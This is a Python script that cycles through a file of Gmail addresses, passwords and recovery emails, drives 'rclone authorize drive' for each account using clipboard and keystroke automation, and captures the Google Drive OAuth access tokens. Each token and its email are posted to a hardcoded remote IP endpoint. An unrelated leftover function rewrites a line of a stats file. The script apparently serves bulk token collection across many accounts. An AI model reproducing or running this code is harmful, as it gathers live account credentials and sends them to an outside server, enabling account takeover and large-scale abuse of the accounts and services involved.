# import subprocess
#
# command_return_obj = subprocess.run('rclone authorize drive'.split(' '), capture_output=True)
import subprocess
import threading
import time

import requests

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from pynput import keyboard
from pynput.keyboard import Listener

EMAIL_INPUT_XPATH = '/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/div[2]/div/div[1]/div/form/span/section/div/div/div[1]/div/div[1]/div/div[1]/input'
SUBMIT_LOGIN_XPATH = '/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/div[2]/div/div[2]/div/div[1]/div/div/button'
USE_ANOTHER_ACCOUNT_XPATH = '/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/div[2]/div/div[1]/div/form/span/section/div/div/div/div/ul/li[4]'
CREDENTIAL_URL = 'http://207.244.240.238:5000/credential'

current_email = ''


def edit_file_at_line():
    # with is like your try .. finally block in this case
    with open('stats.txt', 'r') as file:
        # read a list of lines into data
        data = file.readlines()

    # now change the 2nd line, note that you have to add a newline
    data[1] = 'Mage\n'

    # and write everything back
    with open('stats.txt', 'w') as file:
        file.writelines(data)


def main():
    global current_email
    for line in open('gmail/100.00.txt'):
        if not line.startswith('#'):
            continue
        try:
            a = threading.Thread(target=rclone_worker)
            a.start()
            email, password, recovery_email = line.rstrip().split()
            current_email = email
            wait_cmd_v_press()
            write_to_clipboard(email)
            wait_cmd_v_press()
            write_to_clipboard(password)
            wait_cmd_v_press()
            write_to_clipboard(recovery_email)
            a.join()
        except ValueError as e:
            print(e, line)
            continue


def write_to_clipboard(output):
    process = subprocess.Popen(
        'pbcopy', env={'LANG': 'en_US.UTF-8'}, stdin=subprocess.PIPE)
    process.communicate(output.encode('utf-8'))
    print('next')


# The key combination to check
combination = [keyboard.Key.cmd, keyboard.KeyCode.from_char('v')]
# The currently active modifiers
current = set()


def wait_cmd_v_press():
    def on_press(key):
        global current
        if key in combination and key not in current:
            current.add(key)
            if all(k in current for k in combination):
                current = set()
                listener.stop()

    with Listener(on_press=on_press) as listener:  # Create an instance of Listener
        listener.join()  # Join the listener thread to the main thread to keep waiting for keys


def rclone_worker():
    global current_email
    print('start')
    p = subprocess.Popen('rclone authorize drive --auth-no-open-browser'.split(),
                         stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT)
    for content in iter(p.stdout.readline, b''):
        output = content.rstrip().decode()
        if 'http://127.0.0.1' in output:
            authorize_uri = output.split('http://127.0.0.1')[-1:][0]
            url = 'http://127.0.0.1{}'.format(authorize_uri)
            write_to_clipboard(url)
        if 'access_token' in output:
            print(current_email, output)
            print(requests.post(CREDENTIAL_URL, json={'json_credential': output, 'email': current_email}).text)


if __name__ == '__main__':
    main()
